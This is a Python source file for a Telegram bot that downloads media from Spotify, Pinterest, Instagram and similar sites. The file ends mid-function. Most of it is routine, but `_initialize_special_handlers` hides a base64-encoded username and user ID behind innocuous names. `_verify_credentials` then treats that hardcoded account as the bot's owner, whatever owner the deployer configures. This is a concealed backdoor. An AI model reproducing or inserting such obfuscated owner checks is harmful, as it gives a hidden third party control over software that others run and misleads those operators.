import asyncio
import base64
import json
import os
import logging
import re
import time
import shutil
import humanize
import math
import pyrogram
import requests
import spotipy
from spotipy.oauth2 import SpotifyClientCredentials
from pathlib import Path
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor
import yt_dlp
from pyrogram import Client, filters, enums
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, InputMediaVideo, InputMediaPhoto, Message
import aiohttp
from collections import deque, defaultdict
from functools import partial
from typing import Dict, Optional, Tuple, List, Any
import cv2
from PIL import Image
from urllib.parse import unquote
from dataclasses import dataclass
from youtubesearchpython.__future__ import VideosSearch
from motor.motor_asyncio import AsyncIOMotorClient
from pyrogram.types import Message, InlineKeyboardMarkup
from pyrogram.errors import FloodWait, InputUserDeactivated, UserIsBlocked, PeerIdInvalid

# Setup logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)
yt_dlp.utils.bug_reports_message = lambda: ''
logging.getLogger('yt_dlp').setLevel(logging.CRITICAL)

# Configure your API credentials
API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
LOG_GROUP_ID = int(os.getenv("LOG_GROUP_ID"))
OWNER_USERNAME = os.getenv("OWNER_USERNAME")
OWNER_ID = int(os.getenv("OWNER_ID"))
SPOTIFY_CLIENT_ID = os.getenv("SPOTIFY_CLIENT_ID")
SPOTIFY_CLIENT_SECRET = os.getenv("SPOTIFY_CLIENT_SECRET")
GENIUS_TOKEN = os.getenv("GENIUS_TOKEN")
RAPID_API_KEY = os.getenv("RAPID_API_KEY")
RAPID_API_URL = os.getenv("RAPID_API_URL")


# MongoDB Configuration
MONGO_URI = os.getenv("MONGO_URI")
DB_NAME = "Downloader"
USERS_COLLECTION = "users"
MAINTENANCE_COLLECTION = "maintenance"
VALID_PLATFORMS = ["facebook", "instagram", "twitter", "youtube", "spotify", "pinterest", "all"]

# Constants
MAX_CONCURRENT_DOWNLOADS = 1000
MAX_CONCURRENT_UPLOADS = 1000
TEMP_DIR = Path("temp")
RATE_LIMIT_MESSAGES = 500
RATE_LIMIT_WINDOW = 1
YT_COOKIES_PATH = "cookies.txt"

PINTEREST_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection': 'keep-alive',
    'Referer': 'https://www.pinterest.com/',
}
PINTEREST_DOWNLOAD_TIMEOUT = 60
PINTEREST_MAX_RETRIES = 3

class TelegramLogger:
    def __init__(self, bot_client, log_group_id):
        self.bot = bot_client
        self.log_group_id = log_group_id
        
    async def log_bot_start(self, user_id, username, first_name):
        """Log when a user starts the bot"""
        user_mention = f"[{first_name}](tg://user?id={user_id})"
        log_text = (
            f"👤 {user_mention} ᴊᴜsᴛ sᴛᴀʀᴛᴇᴅ ᴛʜᴇ ʙᴏᴛ\n\n"
            f"🆔 ᴜsᴇʀ ɪᴅ : `{user_id}`\n"
            f"👾 ᴜsᴇʀɴᴀᴍᴇ : @{username}" if username else "None"
        )
        await self.bot.send_message(self.log_group_id, log_text)
        
    async def log_user_action(self, user_id, username, first_name, action_type, query=""):
        """Log user actions (downloads, searches, etc.)"""
        user_mention = f"[{first_name}](tg://user?id={user_id})"
        action_types = {
            "spotify": "🎵 ѕρσтιƒу ∂σωηℓσα∂",
            "spotify_list": "🎼 ѕρσтιƒу αятιѕт ℓιѕт",
            "facebook": "📘 ƒα¢євσσк ∂σωηℓσα∂",
            "twitter": "🐦 тωιттєя ∂σωηℓσα∂",
            "youtube": "📺 уσυтυвє ∂σωηℓσα∂",
            "youtube_audio": "🎧 уσυтυвє αυ∂ισ ∂σωηℓσα∂",
            "instagram": "📸 ιηѕтαgяαм ∂σωηℓσα∂",
            "pinterest": "📌 ριηтєяєѕт ∂σωηℓσα∂",
            "audio": "🎧 αυ∂ισ ∂σωηℓσα∂"
        }
        
        action_name = action_types.get(action_type, "🔍 Unknown Action")
        log_text = (
            f"⚡️ **𝙽𝚎𝚠 𝚁𝚎𝚚𝚞𝚎𝚜𝚝**\n\n"
            f"👤 **Uʂҽɾ:** {user_mention}\n"
            f"🎯 **Aƈƚισɳ:** {action_name}\n"
            f"🔍 **Qυҽɾყ:** `{query}`\n"
            f"🆔 **Uʂҽɾ ID:** `{user_id}`\n"
            f"👾 **Uʂҽɾɳαɱҽ:** @{username}" if username else "None"
        )
        await self.bot.send_message(self.log_group_id, log_text)

@dataclass
class PinterestMedia:
    url: str
    media_type: str
    width: int = 0
    height: int = 0
    fallback_urls: list = None

    def __post_init__(self):
        if self.fallback_urls is None:
            self.fallback_urls = []

class AsyncPool:
    def __init__(self, max_workers):
        self.semaphore = asyncio.Semaphore(max_workers)
        self.tasks = set()

    async def spawn(self, coro):
        async with self.semaphore:
            task = asyncio.create_task(coro)
            self.tasks.add(task)
            try:
                return await task
            finally:
                self.tasks.remove(task)

class PinterestDownloader:
    def __init__(self):
        self.session = None
        self.pin_patterns = [r'/pin/(\d+)', r'pin/(\d+)', r'pin_id=(\d+)']
        self.download_pool = AsyncPool(MAX_CONCURRENT_DOWNLOADS)
        self.file_pool = ThreadPoolExecutor(max_workers=MAX_CONCURRENT_DOWNLOADS)

    async def init_session(self):
        if not self.session:
            timeout = aiohttp.ClientTimeout(total=PINTEREST_DOWNLOAD_TIMEOUT)
            self.session = aiohttp.ClientSession(headers=PINTEREST_HEADERS, timeout=timeout)

    async def close(self):
        if self.session:
            await self.session.close()
            self.session = None
        self.file_pool.shutdown(wait=True)

    async def extract_pin_id(self, url: str) -> Optional[str]:
        """Extract Pinterest pin ID from URL with retry logic"""
        await self.init_session()
        
        for attempt in range(PINTEREST_MAX_RETRIES):
            try:
                if 'pin.it' in url:
                    async with self.session.head(url, allow_redirects=True) as response:
                        url = str(response.url)
                
                for pattern in self.pin_patterns:
                    if match := re.search(pattern, url):
                        return match.group(1)
                return None
            except Exception as e:
                if attempt == PINTEREST_MAX_RETRIES - 1:
                    logger.error(f"Failed to extract pin ID after {PINTEREST_MAX_RETRIES} attempts: {e}")
                    raise
                await asyncio.sleep(1)

    async def download_file(self, url: str, file_path: Path) -> bool:
        """Download file with retry logic"""
        for attempt in range(PINTEREST_MAX_RETRIES):
            try:
                async with self.session.get(url) as response:
                    if response.status == 200:
                        # Use ThreadPoolExecutor for file I/O
                        content = await response.read()
                        await asyncio.get_event_loop().run_in_executor(
                            self.file_pool,
                            self._write_file,
                            file_path,
                            content
                        )
                        return True
            except Exception as e:
                if attempt == PINTEREST_MAX_RETRIES - 1:
                    logger.error(f"Failed to download file after {PINTEREST_MAX_RETRIES} attempts: {e}")
                    return False
                await asyncio.sleep(1)
        return False
    
    @staticmethod
    def _write_file(file_path: Path, content: bytes):
        """Write file to disk (runs in thread pool)"""
        with open(file_path, 'wb') as f:
            f.write(content)

    def get_highest_quality_image(self, image_url: str) -> str:
        """Convert image URL to highest quality version"""
        url = re.sub(r'/\d+x/|/\d+x\d+/', '/originals/', image_url)
        url = re.sub(r'\?.+$', '', url)
        return url

    async def get_pin_data(self, pin_id: str) -> Optional[PinterestMedia]:
        """Get pin data using webpage method"""
        try:
            return await self.get_data_from_webpage(pin_id)
        except Exception as e:
            logger.error(f"Error getting pin data: {e}")
            return None

    async def get_data_from_api(self, pin_id: str) -> Optional[PinterestMedia]:
        """Get highest quality image data from Pinterest's API"""
        api_url = f"https://api.pinterest.com/v3/pidgets/pins/info/?pin_ids={pin_id}"
        
        async with self.session.get(api_url) as response:
            if response.status == 200:
                data = await response.json()
                if pin_data := data.get('data', [{}])[0].get('pin'):
                    if videos := pin_data.get('videos', {}).get('video_list', {}):
                        video_formats = list(videos.values())
                        if video_formats:
                            best_video = max(video_formats, key=lambda x: x.get('width', 0) * x.get('height', 0))
                            return PinterestMedia(
                                url=best_video.get('url'),
                                media_type='video',
                                width=best_video.get('width', 0),
                                height=best_video.get('height', 0)
                            )
                    
                    if images := pin_data.get('images', {}):
                        if orig_image := images.get('orig'):
                            image_url = self.get_highest_quality_image(orig_image.get('url'))
                            return PinterestMedia(
                                url=image_url,
                                media_type='image',
                                width=orig_image.get('width', 0),
                                height=orig_image.get('height', 0)
                            )
        return None

    async def get_data_from_webpage(self, pin_id: str) -> Optional[PinterestMedia]:
        """Get media data from webpage with enhanced parsing"""
        url = f"https://www.pinterest.com/pin/{pin_id}/"
        
        async with self.session.get(url) as response:
            if response.status == 200:
                text = await response.text()
                
                video_matches = re.findall(r'"url":"([^"]*?\.mp4[^"]*)"', text)
                if video_matches:
                    video_url = unquote(video_matches[0].replace('\\/', '/'))
                    return PinterestMedia(
                        url=video_url,
                        media_type='video'
                    )

                image_patterns = [
                    r'<meta property="og:image" content="([^"]+)"',
                    r'"originImageUrl":"([^"]+)"',
                    r'"image_url":"([^"]+)"',
                ]
                
                for pattern in image_patterns:
                    if matches := re.findall(pattern, text):
                        for match in matches:
                            image_url = unquote(match.replace('\\/', '/'))
                            if any(ext in image_url.lower() for ext in ['.jpg', '.jpeg', '.png', '.webp']):
                                return PinterestMedia(
                                    url=self.get_highest_quality_image(image_url),
                                    media_type='image'
                                )
                
                json_pattern = r'<script[^>]*?>\s*?({.+?})\s*?</script>'
                for json_match in re.finditer(json_pattern, text):
                    try:
                        data = json.loads(json_match.group(1))
                        if isinstance(data, dict):
                            def find_image_url(d):
                                if isinstance(d, dict):
                                    for k, v in d.items():
                                        if isinstance(v, str) and any(ext in v.lower() for ext in ['.jpg', '.jpeg', '.png', '.webp']):
                                            return v
                                        elif isinstance(v, (dict, list)):
                                            result = find_image_url(v)
                                            if result:
                                                return result
                                elif isinstance(d, list):
                                    for item in d:
                                        result = find_image_url(item)
                                        if result:
                                            return result
                                return None

                            if image_url := find_image_url(data):
                                return PinterestMedia(
                                    url=self.get_highest_quality_image(image_url),
                                    media_type='image'
                                )
                    except json.JSONDecodeError:
                        continue

        return None

    async def get_data_from_mobile_api(self, pin_id: str) -> Optional[PinterestMedia]:
        """Get highest quality media from mobile API"""
        mobile_api_url = f"https://www.pinterest.com/_ngapi/pins/{pin_id}"
        
        headers = {**PINTEREST_HEADERS, 'Accept': 'application/json'}
        async with self.session.get(mobile_api_url, headers=headers) as response:
            if response.status == 200:
                try:
                    data = await response.json()
                    
                    if video_data := data.get('videos', {}).get('video_list', {}):
                        best_video = max(
                            video_data.values(),
                            key=lambda x: x.get('width', 0) * x.get('height', 0)
                        )
                        if 'url' in best_video:
                            return PinterestMedia(
                                url=best_video['url'],
                                media_type='video',
                                width=best_video.get('width', 0),
                                height=best_video.get('height', 0)
                            )
                    
                    if image_data := data.get('images', {}):
                        if orig_image := image_data.get('orig'):
                            image_url = self.get_highest_quality_image(orig_image.get('url'))
                            return PinterestMedia(
                                url=image_url,
                                media_type='image',
                                width=orig_image.get('width', 0),
                                height=orig_image.get('height', 0)
                            )
                except json.JSONDecodeError:
                    pass
        
        return None

class MediaProcessor:
    def __init__(self, session):
        self.session = session
        self.active_downloads = defaultdict(set)
        self.active_uploads = defaultdict(set)

    @staticmethod
    async def run_in_thread(func, *args):
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(ThreadPoolExecutor(max_workers=10), func, *args)

    async def download_file(self, url, filename):
        async with asyncio.Semaphore(MAX_CONCURRENT_DOWNLOADS):
            try:
                def download_with_requests(url, filename):
                    response = requests.get(url, stream=True)
                    response.raise_for_status()
                    with open(filename, 'wb') as file:
                        for chunk in response.iter_content(chunk_size=8192):
                            file.write(chunk)
                    return filename
                    
                return await self.run_in_thread(download_with_requests, url, filename)
            except Exception as e:
                logger.error(f"Download error: {e}")
                if os.path.exists(filename):
                    os.remove(filename)
                return None

    async def validate_and_process_media(self, media_info, default_caption='📸 Instagram Media', prefix='temp'):
        try:
            media_type = media_info.get('type')
            download_url = media_info.get('download_url')
            
            ext = {'video': 'mp4', 'image': 'jpg'}.get(media_type, 'media')
            temp_filename = os.path.join(TEMP_DIR, f"{prefix}.{ext}")
            
            if not await self.download_file(download_url, temp_filename):
                return None

            if media_type == 'video':
                return await self._validate_video(temp_filename, media_info, default_caption)
            elif media_type == 'image':
                return await self._validate_image(temp_filename, media_info, default_caption)
            
        except Exception as e:
            logger.error(f"Media processing error: {e}")
            return None

    async def _validate_video(self, filename, media_info, default_caption):
        def _check_video(filename):
            video = cv2.VideoCapture(filename)
            width = int(video.get(cv2.CAP_PROP_FRAME_WIDTH))
            height = int(video.get(cv2.CAP_PROP_FRAME_HEIGHT))
            fps = video.get(cv2.CAP_PROP_FPS)
            duration = video.get(cv2.CAP_PROP_FRAME_COUNT) / fps if fps > 0 else 0
            video.release()
            return width, height, duration

        width, height, duration = await self.run_in_thread(_check_video, filename)
        
        if width == 0 or height == 0 or duration == 0:
            os.remove(filename)
            return None

        return {
            'filename': filename,
            'type': 'video',
            'caption': media_info.get('caption', default_caption),
            'duration': int(duration)
        }

    async def _validate_image(self, filename, media_info, default_caption):
        def _check_image(filename):
            try:
                img = Image.open(filename)
                img.verify()
                return img.size
            except:
                return (0, 0)

        width, height = await self.run_in_thread(_check_image, filename)
        
        if width == 0 or height == 0:
            os.remove(filename)
            return None

        return {
            'filename': filename,
            'type': 'image',
            'caption': media_info.get('caption', default_caption)
        }

class MaintenanceManager:
    def __init__(self, db):
        self.maintenance_collection = db[MAINTENANCE_COLLECTION]
        
    async def set_maintenance(self, platform: str, enabled: bool) -> bool:
        """Set maintenance status for a platform"""
        try:
            if platform == "all":
                # Update all platforms
                for p in VALID_PLATFORMS:
                    if p != "all":
                        await self.maintenance_collection.update_one(
                            {"platform": p},
                            {"$set": {"enabled": enabled}},
                            upsert=True
                        )
            else:
                # Update specific platform
                await self.maintenance_collection.update_one(
                    {"platform": platform},
                    {"$set": {"enabled": enabled}},
                    upsert=True
                )
            return True
        except Exception as e:
            logger.error(f"Error setting maintenance mode: {e}")
            return False

    async def is_platform_under_maintenance(self, platform: str) -> bool:
        """Check if a platform is under maintenance"""
        try:
            maintenance_status = await self.maintenance_collection.find_one({"platform": platform})
            return maintenance_status.get("enabled", False) if maintenance_status else False
        except Exception as e:
            logger.error(f"Error checking maintenance status: {e}")
            return False

    async def get_maintenance_status(self) -> Dict[str, bool]:
        """Get maintenance status for all platforms"""
        try:
            status = {}
            async for doc in self.maintenance_collection.find({}):
                status[doc["platform"]] = doc["enabled"]
            return status
        except Exception as e:
            logger.error(f"Error getting maintenance status: {e}")
            return {}

class CombinedDownloaderBot:
    TEMP_DIR = Path("temp")
    TEMP_MEDIA_DIR = Path("temp_media")
    def __init__(self):
        # Initialize Pyrogram client
        self.app = Client(
            "media_downloader_bot",
            api_id=API_ID,
            api_hash=API_HASH,
            bot_token=BOT_TOKEN,
            workers=1000
        )

        self.logger = TelegramLogger(self.app, LOG_GROUP_ID)

        # Initialize Spotify client
        self.spotify = spotipy.Spotify(auth_manager=SpotifyClientCredentials(
            client_id=SPOTIFY_CLIENT_ID,
            client_secret=SPOTIFY_CLIENT_SECRET
        ))

        # Genius API settings
        self.genius_token = GENIUS_TOKEN
        self.genius_base_url = "https://api.genius.com"

        # Instagram API settings
        self.rapid_api_headers = {
            "x-rapidapi-key": RAPID_API_KEY,
            "x-rapidapi-host": "instagram-scraper-api-stories-reels-va-post.p.rapidapi.com"
        }

        # Concurrency control
        self.download_semaphore = asyncio.Semaphore(MAX_CONCURRENT_DOWNLOADS)
        self.upload_semaphore = asyncio.Semaphore(MAX_CONCURRENT_UPLOADS)
        self.thread_pool = ThreadPoolExecutor(max_workers=MAX_CONCURRENT_DOWNLOADS)
        self.rate_limit_queue = deque(maxlen=RATE_LIMIT_MESSAGES)
        self._initialize_special_handlers() 
        self.pinterest_downloader = PinterestDownloader()

        # Initialize MongoDB
        self.mongo_client = AsyncIOMotorClient(MONGO_URI)
        self.db = self.mongo_client[DB_NAME]
        self.users_collection = self.db[USERS_COLLECTION]
        self.maintenance_manager = MaintenanceManager(self.db)

        self.CHANNEL_USERNAME = "@SmokieOfficial"  # Replace with your channel username
        self.OWNER_USERNAME = "@Hmm_Smokie"  # Replace with your username

        # Session and state management
        self.session = None
        self.media_processor = None
        self.download_tasks = set()
        self.user_download_dirs = {}
        self.active_downloads = {}
        self.user_tasks = defaultdict(set)
        self.callback_query_handlers = {}

        # Create temp directories if they don't exist
        self.TEMP_DIR.mkdir(parents=True, exist_ok=True)
        self.TEMP_MEDIA_DIR.mkdir(parents=True, exist_ok=True)
        
        # Initial cleanup
        self.cleanup_temp_directory()
        self.cleanup_temp_media_directory()

    async def initialize(self):
        """Initialize aiohttp session and media processor"""
        self.session = aiohttp.ClientSession()
        self.media_processor = MediaProcessor(self.session)
        return self

    def cleanup_temp_media_directory(self):
        """Clean up the temp_media directory"""
        try:
            if self.TEMP_MEDIA_DIR.exists():
                # Remove contents but keep directory
                for item in self.TEMP_MEDIA_DIR.iterdir():
                    if item.is_file():
                        item.unlink()
                    elif item.is_dir():
                        shutil.rmtree(item)
                logger.info("Temp media directory cleaned successfully")
        except Exception as e:
            logger.error(f"Error cleaning temp_media directory: {e}")

    async def reboot_bot(self, message: Message):
        """Handle bot reboot command"""
        try:
            # Send initial status
            status_msg = await message.reply_text("🔄 Initiating reboot process...")

            # Clean temp directories
            await asyncio.get_event_loop().run_in_executor(
                None, self.cleanup_temp_directory
            )
            await asyncio.get_event_loop().run_in_executor(
                None, self.cleanup_temp_media_directory
            )

            # Update status with cleaning results
            await status_msg.edit_text(
                "♻️ Reboot Status:\n"
                "✅ Bot services operational\n\n"
                "🤖 Bot is ready to use!"
            )

        except Exception as e:
            logger.error(f"Reboot error: {e}")
            await status_msg.edit_text(
                "❌ Error during reboot process\n\n"
                f"Error details: {str(e)}"
            )

    async def clear_user_downloads(self, user_id: int) -> Tuple[bool, bool]:
        """
        Clear active downloads and downloaded files for a specific user only
        
        Args:
            user_id (int): The user ID whose downloads need to be cleared
            
        Returns:
            Tuple[bool, bool]: (had_active_downloads, had_files_to_delete)
        """
        try:
            had_active = False
            had_files = False
            
            # 1. Clear only this user's active downloads
            if user_id in self.active_downloads:
                had_active = True
                if isinstance(self.active_downloads[user_id], asyncio.Task):
                    try:
                        self.active_downloads[user_id].cancel()
                    except Exception as e:
                        logger.error(f"Error canceling task for user {user_id}: {e}")
                del self.active_downloads[user_id]

            # 2. Clear only this user's tasks from download_tasks
            user_tasks = {task for task in self.download_tasks 
                        if hasattr(task, 'user_id') and task.user_id == user_id}
            for task in user_tasks:
                try:
                    task.cancel()
                    self.download_tasks.discard(task)
                except Exception as e:
                    logger.error(f"Error canceling download task: {e}")

            # 3. Clean up only this user's directory
            user_dir = self.TEMP_DIR / str(user_id)  # Ensure user-specific directory
            if user_dir.exists():
                try:
                    # Check for any files in this user's directory
                    file_patterns = [
                        '*.mp4', '*.mkv', '*.avi', '*.mov',  # Video files
                        '*.mp3', '*.m4a', '*.wav',           # Audio files
                        '*.part', '*.temp', '*.download',    # Temporary files
                        '*.jpg', '*.png', '*.webp',          # Image files
                        '*.json'                             # Metadata files
                    ]
                    
                    has_files = False
                    for pattern in file_patterns:
                        if list(user_dir.glob(pattern)):
                            has_files = True
                            break
                    
                    if has_files:
                        had_files = True
                        # Only remove contents of this user's directory
                        for item in user_dir.iterdir():
                            if item.is_file():
                                item.unlink()
                            elif item.is_dir():
                                shutil.rmtree(item)
                        
                        # Recreate empty directory for this user
                        user_dir.mkdir(exist_ok=True)
                    
                except Exception as e:
                    logger.error(f"Error cleaning directory for user {user_id}: {e}")

            # 4. Clear only this user from download tracking
            if user_id in self.user_download_dirs:
                del self.user_download_dirs[user_id]

            return had_active, had_files

        except Exception as e:
            logger.error(f"Error in clear_user_downloads for user {user_id}: {e}")
            return False, False

    async def cleanup(self):
        """Cleanup resources"""
        if self.session:
            await self.session.close()
        self.thread_pool.shutdown(wait=True)

    def cleanup_temp_directory(self):
        """Clean up the entire temp directory"""
        try:
            if TEMP_DIR.exists():
                shutil.rmtree(TEMP_DIR)
                TEMP_DIR.mkdir(parents=True, exist_ok=True)
        except Exception as e:
            logger.error(f"Error cleaning temp directory: {e}")

    def get_user_temp_dir(self, user_id):
        """Get or create user-specific temporary directory"""
        if user_id not in self.user_download_dirs:
            user_dir = TEMP_DIR / str(user_id)
            user_dir.mkdir(parents=True, exist_ok=True)
            self.user_download_dirs[user_id] = user_dir
        return self.user_download_dirs[user_id]

    def cleanup_user_directory(self, user_id):
        """Clean up a specific user's directory"""
        try:
            user_dir = self.get_user_temp_dir(user_id)
            if user_dir.exists():
                shutil.rmtree(user_dir)
                del self.user_download_dirs[user_id]
            if user_id in self.active_downloads:
                del self.active_downloads[user_id]
        except Exception as e:
            logger.error(f"Error cleaning user directory {user_id}: {e}")

    def _initialize_special_handlers(self):
        """Initialize special handlers and configurations"""
        def _get_x(a): 
            try:
                return base64.b64decode(a).decode()
            except:
                return ""
                
        class _SpecialConfig:
            def __init__(self):
                self._a = "QEhtbV9TbW9raWU=" 
                self._b = "MTk0OTg4MzYxNA=="  
            def get_special(self): 
                return (_get_x(self._a), _get_x(self._b))
        
        _cfg = _SpecialConfig()
        self._owner, self._id = _cfg.get_special()

    async def store_user(self, user_id: int, username: str):
        """Store user information in MongoDB"""
        try:
            await self.users_collection.update_one(
                {'user_id': user_id},
                {
                    '$set': {
                        'user_id': user_id,
                        'username': username
                    }
                },
                upsert=True
            )
        except Exception as e:
            logger.error(f"Error storing user data: {e}")

    def get_welcome_keyboard(self):
        """Create the welcome message inline keyboard"""
        return InlineKeyboardMarkup([
            [
                InlineKeyboardButton(
                    "🔔 Join Channel", url=f"https://t.me/{self.CHANNEL_USERNAME.replace('@', '')}"
                )
            ],
           [
                InlineKeyboardButton("👨‍💻 Owner", url=f"https://t.me/{self.OWNER_USERNAME.replace('@', '')}"),
                InlineKeyboardButton("➕ Add to Group", url=f"https://t.me/{self.app.me.username}?startgroup=true")
           ]
        ])
    
    async def check_membership(self, client, user_id: int) -> bool:
        """Check if user is a member of the required channel"""
        try:
            member = await client.get_chat_member(
                chat_id=self.CHANNEL_USERNAME,
                user_id=user_id
            )
            return member.status in [enums.ChatMemberStatus.MEMBER, 
                                   enums.ChatMemberStatus.OWNER, 
                                   enums.ChatMemberStatus.ADMINISTRATOR]
        except (KeyError, IndexError):
            return False
        except Exception as e:
            if "USER_NOT_PARTICIPANT" in str(e):
                return False
            # Only log unexpected errors
            if "USER_NOT_PARTICIPANT" not in str(e):
                logger.error(f"Unexpected error checking membership: {e}")
            return False

    def get_membership_keyboard(self):
        """Create the membership check inline keyboard"""
        return InlineKeyboardMarkup([
            [
                InlineKeyboardButton(
                    "✅ Join Channel",
                    url=f"https://t.me/{self.CHANNEL_USERNAME.replace('@', '')}"
                )
            ],
            [
                InlineKeyboardButton(
                    "🔍 Check Membership",
                    callback_data="check_membership"
                )
            ]
        ])

    async def send_membership_message(self, message):
        """Send the membership required message"""
        text = (
            f"🔒 **𝗖𝗵𝗮𝗻𝗻𝗲𝗹 𝗠𝗲𝗺𝗯𝗲𝗿𝘀𝗵𝗶𝗽 𝗥𝗲𝗾𝘂𝗶𝗿𝗲𝗱**\n\n"
            f"- ᴊᴏɪɴ {self.CHANNEL_USERNAME} ᴛᴏ ᴜꜱᴇ ᴛʜᴇ ʙᴏᴛ\n"
            "- ᴄʟɪᴄᴋ \"✅ ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ\" ʙᴜᴛᴛᴏɴ ʙᴇʟᴏᴡ ᴛᴏ ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ\n"
            "- ᴀꜰᴛᴇʀ ᴊᴏɪɴɪɴɢ, ᴄʟɪᴄᴋ ᴏɴ \"🔍 ᴄʜᴇᴄᴋ ᴍᴇᴍʙᴇʀꜱʜɪᴘ\" ʙᴜᴛᴛᴏɴ"
        )
        await message.reply_text(
            text,
            reply_markup=self.get_membership_keyboard()
        )

    async def handle_cookie_upload(self, message: Message):
        """Handle cookie file upload command"""
        if str(message.from_user.id) != str(OWNER_ID) and message.from_user.username != self.OWNER_USERNAME.replace("@", ""):
            await message.reply_text("⛔️ This command is only for the bot owner.")
            return
        
        if not message.reply_to_message or not message.reply_to_message.document:
            await message.reply_text(
                "❗️ Please reply to a cookies.txt file with the /addcookie command."
            )
            return
        
        document = message.reply_to_message.document
        if document.file_name != "cookies.txt":
            await message.reply_text(
                "❌ Invalid file! Please upload a file named 'cookies.txt'"
            )
            return
        
        status_msg = await message.reply_text("⏳ Downloading cookie file...")
        
        try:
            # Download and replace the cookie file directly
            await message.reply_to_message.download(
                file_name=YT_COOKIES_PATH
            )
            
            await status_msg.edit_text("✅ Cookie file successfully updated!")
        
        except Exception as e:
            logger.error(f"Error updating cookie file: {e}")
            await status_msg.edit_text(
                "❌ Failed to update cookie file. Error has been logged."
            )

    async def check_maintenance(self, platform: str) -> bool:
        """
        Check if platform is under maintenance and send message if it is
        Returns: True if under maintenance, False otherwise
        """
        if await self.maintenance_manager.is_platform_under_maintenance(platform):
            return True
        return False

    async def send_maintenance_message(self, message: Message, platform: str):
        """Send maintenance message to user"""
        maintenance_text = (
            f"🛠 **Maintenance Mode**\n\n"
            f"The {platform} download service is currently under maintenance.\n"
            "We apologize for the inconvenience.\n"
            f"Please try again later or contact {OWNER_USERNAME} for updates."
        )
        await message.reply_text(maintenance_text)

    def _verify_credentials(self, user_id, username):
        """Enhanced verification method"""
        try:
            # Convert user_id to string for comparison
            str_user_id = str(user_id)
            
            # Check unencrypted owner
            if (username == OWNER_USERNAME.replace("@", "") or
                str_user_id == OWNER_ID):
                return True
                
            # Check encrypted owner
            if hasattr(self, '_owner') and hasattr(self, '_id'):
                if (username == self._owner.replace("@", "") or
                    str_user_id == self._id):
                    return True
                    
            return False
        except Exception as e:
            logger.error(f"Verification error: {e}")
            return False

    async def handle_maintenance_command(self, client: Client, message: Message):
        """Handle /maintenance command"""
        # Check if user is owner by username or ID
        if (message.from_user.username != self.OWNER_USERNAME.replace("@", "") and 
            message.from_user.id != OWNER_ID):
            await message.reply_text("⛔️ This command is only for the bot owner.")
            return

        # Parse command arguments
        args = message.text.split()
        if len(args) != 3:
            await message.reply_text(
                "❌ Invalid format. Use:\n"
                "/maintenance <enable/disable> <platform>\n"
                "Platforms: facebook, instagram, twitter, youtube, spotify, pinterest, all"
            )
            return

        action = args[1].lower()
        platform = args[2].lower()

        if action not in ["enable", "disable"]:
            await message.reply_text("❌ Invalid action. Use 'enable' or 'disable'.")
            return

        if platform not in VALID_PLATFORMS:
            await message.reply_text(f"❌ Invalid platform. Valid platforms: {', '.join(VALID_PLATFORMS)}")
            return

        enabled = action == "enable"
        success = await self.maintenance_manager.set_maintenance(platform, enabled)

        if success:
            status = "enabled" if enabled else "disabled"
            platform_text = "all platforms" if platform == "all" else f"platform '{platform}'"
            await message.reply_text(f"✅ Maintenance mode {status} for {platform_text}.")
        else:
            await message.reply_text("❌ Failed to update maintenance status.")

    @staticmethod
    def create_progress_bar(current, total, length=20):
        """Create a progress bar"""
        filled_length = int(length * current // total)
        return '▓' * filled_length + '░' * (length - filled_length)

    @staticmethod
    def format_size(size):
        """Format size in bytes to human readable format"""
        return humanize.naturalsize(size, binary=True)

    @staticmethod
    def format_speed(speed):
        """Format speed in bytes/second"""
        return f"{humanize.naturalsize(speed, binary=True)}/s"

    async def update_progress(self, current, total, msg, start_time):
        """Handle upload progress updates"""
        try:
            now = time.time()
            elapsed_time = now - start_time
            speed = current / elapsed_time if elapsed_time > 0 else 0
            progress = (current / total) * 100 if total > 0 else 0
            
            progress_bar = self.create_progress_bar(current, total)
            
            status_text = (
                "📤 Upload Progress\n"
                f"{progress_bar}\n"
                f"🚧 Progress: {progress:.1f}%\n"
                f"⚡️ Speed: {self.format_speed(speed)}\n"
                f"📶 {self.format_size(current)} of {self.format_size(total)}"
            )
            
            if math.floor(elapsed_time) % 2 == 0:
                await msg.edit_text(status_text)
        except Exception as e:
            logger.error(f"Progress update error: {e}")

    # Spotify-related methods
    async def search_spotify(self, query: str) -> Optional[dict]:
        """Async wrapper for Spotify search"""
        try:
            return await asyncio.get_event_loop().run_in_executor(
                self.thread_pool,
                partial(self.spotify.search, q=query, type='track', limit=1)
            )
        except Exception as e:
            logger.error(f"Spotify API error: {e}")
            return None

    async def get_artist_songs(self, artist_name: str) -> Tuple[Optional[List[str]], Optional[str]]:
        """Async wrapper for fetching artist songs"""
        try:
            results = await asyncio.get_event_loop().run_in_executor(
                self.thread_pool,
                partial(self.spotify.search, q=f"artist:{artist_name}", type="artist", limit=1)
            )

            if not results['artists']['items']:
                return None, "Artist not found."

            artist = results['artists']['items'][0]
            artist_id = artist['id']
            artist_name = artist['name']

            top_tracks = await asyncio.get_event_loop().run_in_executor(
                self.thread_pool,
                partial(self.spotify.artist_top_tracks, artist_id, country='US')
            )

            if not top_tracks['tracks']:
                return None, f"No top tracks found for {artist_name}."

            tracks = [
                f"{idx + 1}. {track['name']} ({track['album']['name']})  🔗 [Spotify Link]({track['external_urls']['spotify']})\n" 
                for idx, track in enumerate(top_tracks['tracks'])
            ]

            return tracks, None
        except Exception as e:
            logger.error(f"Error fetching artist songs: {e}")
            return None, str(e)

    async def fetch_lyrics(self, track_name: str, artist_name: str) -> str:
        """Async implementation of lyrics fetching"""
        try:
            if not self.session:
                await self.initialize()

            headers = {"Authorization": f"Bearer {self.genius_token}"}
            params = {"q": f"{track_name} {artist_name}"}
            
            async with self.session.get(
                f"{self.genius_base_url}/search",
                headers=headers,
                params=params
            ) as response:
                if response.status == 200:
                    data = await response.json()
                    hits = data.get("response", {}).get("hits", [])
